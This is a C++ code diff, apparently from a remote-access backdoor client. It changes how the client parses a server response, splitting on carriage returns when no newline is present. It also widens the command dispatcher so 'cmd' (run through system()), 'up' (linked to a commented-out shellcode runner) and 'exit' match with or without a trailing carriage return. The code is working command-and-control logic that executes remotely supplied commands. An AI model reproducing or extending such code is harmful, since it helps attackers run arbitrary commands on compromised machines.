@@ -88,9 +88,16 @@ public:
     Configure(string response)
     {
         istringstream is(response);	
-        string line;	
+        string line;
 
-        while (getline(is, line, '\n'))
+        char split = '\n';
+        if (response.find("\n") == -1)
+        {
+            split = '\r';
+        }
+
+
+        while (getline(is, line, split))
         {
            
             int line_len = line.length();
@@ -117,11 +124,11 @@ public:
     VOID Selector()
     {
 
-        if (this->type == "cmd\r")
+        if (this->type == "cmd\r" || this->type == "cmd")
         {
             system((this->value).c_str());
         }
-        else if (this->type == "up\r")
+        else if (this->type == "up\r" || this->type == "up")
         {
             //shellcode_run(this->value);
             try {
@@ -133,7 +140,7 @@ public:
             {
             };
         }
-        else if (this->type == "exit\r")
+        else if (this->type == "exit\r" || this->type == "exit")
         {
             exit(0);
         }
